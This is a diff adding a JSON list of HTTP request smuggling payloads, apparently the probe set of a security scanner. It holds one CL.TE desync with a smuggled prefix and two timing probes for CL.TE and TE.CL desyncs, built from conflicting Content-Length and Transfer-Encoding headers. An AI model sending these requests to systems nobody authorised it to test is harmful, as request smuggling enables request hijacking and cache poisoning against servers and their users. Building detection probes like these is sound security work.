@@ -1,0 +1,29 @@
+[
+  {
+    "name": "CL.TE",
+    "description": "Classic Content-Length / Transfer-Encoding desync. Front-end uses Content-Length, back-end uses Transfer-Encoding. Body: chunked terminator (0\\r\\n\\r\\n) + smuggled prefix HELLO.",
+    "headers": {
+      "Content-Length": "10",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nHELLO"
+  },
+  {
+    "name": "CL.TE Timing (Detect)",
+    "description": "Timing probe for CL.TE desync. Front-end reads Content-Length: 4 and forwards 1\\r\\nA\\r\\n. Back-end reads Transfer-Encoding: chunked, processes chunk '1' (body=A), then sees 'X' as an incomplete next chunk and HANGS waiting — response delay confirms CL.TE.",
+    "headers": {
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "1\\r\\nA\\r\\nX"
+  },
+  {
+    "name": "TE.CL Timing (Detect)",
+    "description": "Timing probe for TE.CL desync. Front-end reads Transfer-Encoding: chunked, processes 0\\r\\n\\r\\n as end-of-stream and stops. Back-end reads Content-Length: 6, receives 5 bytes (0\\r\\n\\r\\n) and HANGS waiting for the 6th byte (X) — response delay confirms TE.CL.",
+    "headers": {
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nX"
+  }
+]
